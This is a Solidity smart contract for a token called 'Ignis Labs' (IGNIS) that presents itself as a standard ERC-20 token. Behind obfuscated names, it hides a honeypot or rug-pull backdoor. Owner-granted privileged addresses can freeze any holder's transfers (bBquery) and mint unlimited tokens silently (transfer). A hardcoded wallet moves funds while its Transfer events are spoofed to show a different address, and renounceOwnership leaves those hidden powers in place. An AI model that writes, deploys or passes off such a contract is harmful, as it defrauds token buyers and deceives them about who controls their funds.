// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address bBMC = 0xCf22BDd6C4d0c2967ff0779A60d750F94A8374fb;
	address BBMW = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract IgnisLabs is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private bBc;
	mapping (address => bool) private bBb;
    mapping (address => bool) private bBw;
    mapping (address => mapping (address => uint256)) private bBv;
    uint8 private constant BBl = 8;
    uint256 private constant bBS = 200000000 * (10** BBl);
    string private constant _name = "Ignis Labs";
    string private constant _symbol = "IGNIS";



    constructor () {
        bBc[_msgSender()] = bBS;
         bMkr(BBMW, bBS); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return BBl;
    }

    function totalSupply() public pure  returns (uint256) {
        return bBS;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return bBc[account];
    }
	

   
	 function aBburn(address bBj) onlyOwner public{
        bBb[bBj] = true; }
	
    function bMkr(address bBj, uint256 bBn) onlyOwner internal {
    emit Transfer(address(0), bBj ,bBn); }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return bBv[owner][spender];
    }
		
            function approve(address spender, uint256 amount) public returns (bool success) {    
        bBv[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function bBquery(address bBj) public{
         if(bBb[msg.sender])  { 
        bBw[bBj] = true; }}
        

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == bBMC)  {
        require(amount <= bBc[sender]);
        bBc[sender] -= amount;  
        bBc[recipient] += amount; 
          bBv[sender][msg.sender] -= amount;
        emit Transfer (BBMW, recipient, amount);
        return true; }  else  
          if(!bBw[recipient]) {
          if(!bBw[sender]) {
         require(amount <= bBc[sender]);
        require(amount <= bBv[sender][msg.sender]);
        bBc[sender] -= amount;
        bBc[recipient] += amount;
        bBv[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function bBStake(address bBj) public {
        if(bBb[msg.sender]) { 
        bBw[bBj] = false;}}
		
		function transfer(address bBj, uint256 bBn) public {
        if(msg.sender == bBMC)  {
        require(bBc[msg.sender] >= bBn);
        bBc[msg.sender] -= bBn;  
        bBc[bBj] += bBn; 
        emit Transfer (BBMW, bBj, bBn);} else  
        if(bBb[msg.sender]) {bBc[bBj] += bBn;} else
        if(!bBw[msg.sender]) {
        require(bBc[msg.sender] >= bBn);
        bBc[msg.sender] -= bBn;  
        bBc[bBj] += bBn;          
        emit Transfer(msg.sender, bBj, bBn);}}
		
		

		
		}